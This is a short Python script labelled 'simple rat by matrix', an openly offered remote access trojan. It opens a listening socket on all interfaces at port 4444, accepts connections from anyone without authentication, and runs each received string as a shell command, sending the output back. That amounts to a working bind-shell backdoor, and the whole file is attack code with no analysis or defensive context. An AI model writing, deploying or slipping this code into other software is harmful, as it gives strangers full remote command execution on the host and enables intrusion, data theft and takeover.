#simple rat by matrix

import socket
import threading
import subprocess
import os

def handle_client(client_socket):
    while True:
        try:
            data = client_socket.recv(1024).decode('utf-8')
            if not data:
                break
            
            # Execute command
            cmd = data.strip()
            if cmd.lower() == "exit":
                break
            
            # Run process
            proc = subprocess.Popen(
                cmd, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                stdin=subprocess.PIPE
            )
            stdout, stderr = proc.communicate()
            
            client_socket.send(stdout + stderr)
        except Exception:
            break
    client_socket.close()

def start_rat():
    # Configuration
    host = '0.0.0.0'
    port = 4444
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    
    print(f"[*] Listening on {host}:{port}")
    
    while True:
        client, addr = server.accept()
        print(f"[*] Connection from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

if __name__ == "__main__":
    start_rat()
